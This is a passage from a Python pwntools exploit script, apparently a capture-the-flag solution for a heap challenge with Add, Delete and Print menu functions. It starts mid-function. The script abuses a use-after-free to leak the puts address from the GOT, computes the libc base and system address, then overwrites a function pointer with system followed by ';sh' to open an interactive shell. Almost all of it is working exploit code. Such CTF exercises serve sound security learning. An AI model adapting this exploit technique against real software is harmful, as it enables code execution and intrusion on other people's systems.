    Add(0x80,b'B'*0x80) # index 1
    Delete(0)
    Delete(1)
    payload_0 = p32(0x0804862b) + p32(puts_got)
    Add(0x08,payload_0) # index 2
    Print(0)
    leak_data = io.recvn(4)
    io.recvline(b'\n')
    puts_addr = u32(leak_data)
    print("\n[+] Leak puts address :",hex(puts_addr))
    libc_base = puts_addr - libc.sym['puts']
    print("\n[+] Leak libc base address :",hex(libc_base))
    system = libc_base + libc.sym['system']
    print("\n[+] Leak system address :",hex(system))
    # gdb.attach(io)
    Add(0x80,b'C'*0x80) # index 3
    Delete(2)
    Delete(3)
    payload_1 = p32(system) + b";sh\x00"
    Add(0x08,payload_1)
    # gdb.attach(io)
    Print(2)
    io.interactive()

if __name__ == "__main__":

    main()
```
